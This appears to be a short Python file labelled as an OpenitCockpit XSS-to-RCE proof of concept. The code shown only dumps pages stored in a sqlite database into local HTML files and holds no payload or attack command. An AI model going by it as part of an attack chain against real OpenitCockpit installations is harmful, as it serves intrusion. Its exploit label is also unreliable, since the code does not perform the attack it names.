# Exploit Title: OpenitCockpit XSS to RCE - POC
# Date: 2021-08-14
# Exploit Author: Youssef B
# Tested against: OpenitCockpit

import os
from db import create_conn, get_content, get_locations

database = r"sqlite.db"
contentDir = os.getcwd() + "/content"

def write_to_file(url, content):
    fileName = url.replace('https://','')
    
    if not fileName.endswith(".html"):
        fileName = fileName + ".html"
    
    fullname = os.path.join(contentDir, fileName)
    path, basename = os.path.split(fullname)

    if not os.path.exists(path):
        os.makedirs(path)
    
    with open(fullname, 'w') as f:
        f.write(content)

if __name__ == '__main__':
    conn = create_conn(database)
    locations = get_locations(conn)

    for l in locations:
        content = get_content(conn, l)
        write_to_file(l[0], content)
